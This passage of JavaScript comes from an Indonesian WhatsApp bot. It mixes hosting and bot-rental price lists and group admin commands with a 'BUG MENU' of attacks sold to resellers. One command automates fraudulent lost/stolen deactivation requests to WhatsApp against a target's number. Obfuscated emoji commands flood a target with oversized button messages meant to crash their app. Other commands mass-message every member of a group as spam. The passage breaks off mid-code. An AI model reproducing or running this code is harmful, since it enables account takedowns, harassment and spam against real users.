🕰️ 𝗪𝗮𝗸𝘁𝘂: ${time}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 𝗛𝗔𝗜𝗞𝗔𝗟
𝗗𝗶 𝗧𝘂𝗻𝗴𝗴𝘂 𝗢𝗿𝗱𝗲𝗿𝗮𝗻 𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮☺️`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'listpanel':{
let list =`Hai Kak ${pushname}

*Pricelist Harga Kalzx Panel* :

1GB RAM/1GB Disk/50% CPU
Rp2.000,00/1 BULAN

2GB RAM/2GB Disk/70% CPU
Rp4.000,00/1 BULAN

3GB RAM/3GB Disk/100% CPU
Rp6.000,00/1 BULAN

4GB RAM/4GB Disk/125% CPU
Rp8.000,00/1 BULAN

5GB RAM/5GB Disk/150% CPU
Rp10.000,00/1 BULAN

6GB RAM/6GB Disk/175% CPU
Rp12.000.00/1 BULAN

7GB RAM/7GB Disk/175% CPU
Rp15.000.00/1 BULAN

8GB RAM/8GB Disk/200% CPU
Rp16.000,00/1 BULAN

UNLI RAM/UNLI Disk/UNLI CPU
Rp10.000,00/1 BULAN

Nb:
Kalau Andah sudah Transfer artinya anda setuju dengan segala kebijakan kami.
Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minimal selama 23hari.

*© KalzxFluit*`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: list,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'sewa': case 'listsewa':
if (isBan) return reply(mess.ban)
await loading()
ewe = `🏷 *List Harga Sewa Bot Kalzx* 

🔏 3 hari = 10k
🔏 1 minggu = 15k
🔏 2 minggu = 25k
🔏 1 bulan = 40k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'sewabot':
if (isBan) return reply(mess.ban)
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
await loading()
let cret = await kalz.groupCreate(args.join(" "), [])
let ky = await kalz.groupInviteCode(cret.id)
kalz.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${ky}
`, m})
reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break
//=================== G R O U P =====================//
case 'totag': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
kalz.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break
case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
let response = await kalz.groupInviteCode(from)
kalz.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'resetlinkgc':
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
kalz.groupRevokeInvite(from)
break
case 'sendlinkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await kalz.groupInviteCode(from)
kalz.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
case 'kick': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'remove')
reply(mess.done)
}
break
case 'add': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'add')
reply(mess.done)
}
break
case 'promote': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'promote')
reply(mess.done)
}
break
case 'demote': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kalz.groupParticipantsUpdate(from, [users], 'demote')
reply(mess.done)
}
break
case 'hidetag': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
await loading()
kalz.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:fcall})
}
break
case 'tagall': {
if (!isAdmins) return reply(mess.admin)
if (!m.isGroup) return
await loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
kalz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:fcall })
}
break

case 'pushkontak2':{
if (!isCreator) return reply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await kalz.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
kalz.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break;
case 'pushkontak':{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`di group coy`)
if (!text) return reply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
kalz.sendMessage(geek, {text: `${teksnye}`}, {quoted:fcall})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case "cekidgc": {
if (!isCreator) return reply(mess.premium)
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await kalz.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break
case 'getidgc':
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await kalz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'join': {
if (!isCreator) return reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await kalz.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

/////////////////////////////////[ BUG MENU ]\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

case 'verify': 
case 'banned': 
case 'basmi':
case 'kenon': 
case 'logout':  {
if (!isCreator) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await kalz.onWhatsApp(froms)
if (cekno.length == 0) return
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`FROM WhatsApp Support
Hai,
 Terima kasih atas pesan Anda.
 Kami telah menonaktifkan akun WhatsApp Anda.  Ini berarti akun Anda untuk sementara dinonaktifkan dan akan dihapus secara otomatis dalam 30 hari jika Anda tidak mendaftarkan ulang akun tersebut.  Harap dicatat: Tim Dukungan Pelanggan WhatsApp tidak dapat menghapus akun Anda secara manual.
 Selama periode penonaktifan:
 • Kontak Anda di WhatsApp mungkin masih melihat nama dan gambar profil Anda. 
 • Setiap pesan yang mungkin dikirim oleh kontak Anda ke akun akan tetap dalam status tertunda hingga 30 hari.
 Jika Anda ingin mendapatkan kembali akun Anda, daftarkan ulang akun Anda sebagai secepatnya.  
 Daftar ulang akun Anda dengan memasukkan kode 6 digit, kode yang Anda terima melalui SMS atau panggilan telepon. Jika Anda mendaftar ulang
 pulihkan riwayat obrolan Anda di: Android |  iPhone.
 file, cadangan, atau riwayat panggilan dari akun yang dihapus.
 akun sebelum dihapus, Anda akan tetap berada di semua obrolan grup.  Anda akan memiliki opsi untuk memulihkan data Anda.  Pelajari caranya Jika Anda tidak mendaftarkan ulang akun Anda, akun tersebut mungkin akan dihapus dan proses ini tidak dapat dibatalkan.  Sayangnya, WhatsApp tidak dapat membantu Anda memulihkan obrolan, dokumen, media
 Catatan: Jika perangkat Anda hilang atau dicuri, sebaiknya hubungi penyedia seluler Anda untuk memblokir kartu SIM Anda sesegera mungkin.  Memblokir kartu SIM Anda mencegah orang lain mendaftar dan mengakses akun yang terkait dengan kartu SIM.
 Sumber daya terkait:
  Untuk informasi lebih lanjut tentang penonaktifan akun pada ponsel yang hilang dan dicuri, silakan baca artikel ini.
  Pelajari tentang akun yang dicuri di artikel ini.
 Jika Anda memiliki pertanyaan atau masalah lain, jangan ragu untuk menghubungi kami.  Kami akan dengan senang hati membantu!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else m.reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else m.reply('Masukkan nomor target!')
}
break

case '🔥':
case '☕':
case '🌷':{
if (!isCreator) return reply('Buy reseller dulu cuma 4k, beli ke 6289528157038')
if (!q) return m.reply(`Penggunaan ${prefix+command} 628xxxx`)
function _0x26fe(_0x1985a1,_0x8ead85){const _0x14d304=_0x14d3();return _0x26fe=function(_0x26fe5b,_0x4d7c92){_0x26fe5b=_0x26fe5b-0x1a5;let _0x3a3efe=_0x14d304[_0x26fe5b];return _0x3a3efe;},_0x26fe(_0x1985a1,_0x8ead85);}const _0x134514=_0x26fe;(function(_0xcfe365,_0x1d1e4e){const _0x575af3=_0x26fe,_0x1edf3c=_0xcfe365();while(!![]){try{const _0x182124=parseInt(_0x575af3(0x1b6))/0x1*(parseInt(_0x575af3(0x1b5))/0x2)+-parseInt(_0x575af3(0x1b3))/0x3*(parseInt(_0x575af3(0x1aa))/0x4)+parseInt(_0x575af3(0x1a9))/0x5+-parseInt(_0x575af3(0x1af))/0x6*(-parseInt(_0x575af3(0x1ab))/0x7)+-parseInt(_0x575af3(0x1a8))/0x8+parseInt(_0x575af3(0x1a7))/0x9+-parseInt(_0x575af3(0x1a5))/0xa*(-parseInt(_0x575af3(0x1b4))/0xb);if(_0x182124===_0x1d1e4e)break;else _0x1edf3c['push'](_0x1edf3c['shift']());}catch(_0x19cf98){_0x1edf3c['push'](_0x1edf3c['shift']());}}}(_0x14d3,0x4ec4e));let jumlah='10',bacot=q+_0x134514(0x1a6);var cekNumber=await kalz[_0x134514(0x1ac)](bacot);if(cekNumber[_0x134514(0x1b0)]==0x0)return m[_0x134514(0x1b2)](_0x134514(0x1b1));function _0x14d3(){const _0x33f365=['6283834558105','gagal','6WUoRxV','length','Gagal\x20mengirim\x20pesan,\x20nomor\x20target\x20tidak\x20ditemukan.','reply','3RqTnNT','1633929OFoKDI','4392gUkyyW','3yylBNq','10OSnqUO','@s.whatsapp.net','3248685pvkrkD','2152968ZnEKWn','630170EPCwGY','706736NbOCmt','884219ejOPaW','onWhatsApp'];_0x14d3=function(){return _0x33f365;};return _0x14d3();}if(q==_0x134514(0x1ad))return m[_0x134514(0x1b2)](_0x134514(0x1ae));
m.reply('Proses...⌛')
for (let i = 0; i < jumlah; i++) {
function _0x4952(){var _0x3fd9c0=['4938440dtTEQj','BUG\x20BY\x20KALZX','22DjAUaM','126472bPbnNR','2072504yyadaI','102zxjXrw','51595dGyPWd','2979252fHHTCu','☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','51GQOZhv','2026FZReRL','172FbzpIW','198EJwiJS','9732cHFEaH','https://www.whatsapp.com/otp/copy/'];_0x4952=function(){return _0x3fd9c0;};return _0x4952();}function _0x2443(_0x34d04a,_0x122b93){var _0x495223=_0x4952();return _0x2443=function(_0x244373,_0x4441f8){_0x244373=_0x244373-0x1b1;var _0x2611d9=_0x495223[_0x244373];return _0x2611d9;},_0x2443(_0x34d04a,_0x122b93);}var _0x49e64a=_0x2443;(function(_0x2323b5,_0x43579a){var _0x3087b9=_0x2443,_0x5645f5=_0x2323b5();while(!![]){try{var _0x27486c=parseInt(_0x3087b9(0x1bb))/0x1*(parseInt(_0x3087b9(0x1bc))/0x2)+-parseInt(_0x3087b9(0x1ba))/0x3*(-parseInt(_0x3087b9(0x1be))/0x4)+-parseInt(_0x3087b9(0x1b7))/0x5*(-parseInt(_0x3087b9(0x1b6))/0x6)+parseInt(_0x3087b9(0x1b5))/0x7+-parseInt(_0x3087b9(0x1b4))/0x8*(parseInt(_0x3087b9(0x1bd))/0x9)+parseInt(_0x3087b9(0x1b1))/0xa+-parseInt(_0x3087b9(0x1b3))/0xb*(parseInt(_0x3087b9(0x1b8))/0xc);if(_0x27486c===_0x43579a)break;else _0x5645f5['push'](_0x5645f5['shift']());}catch(_0x5534f7){_0x5645f5['push'](_0x5645f5['shift']());}}}(_0x4952,0x522d4),kalz['sendMessage'](bacot,{'text':_0x49e64a(0x1b2),'templateButtons':[{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https:/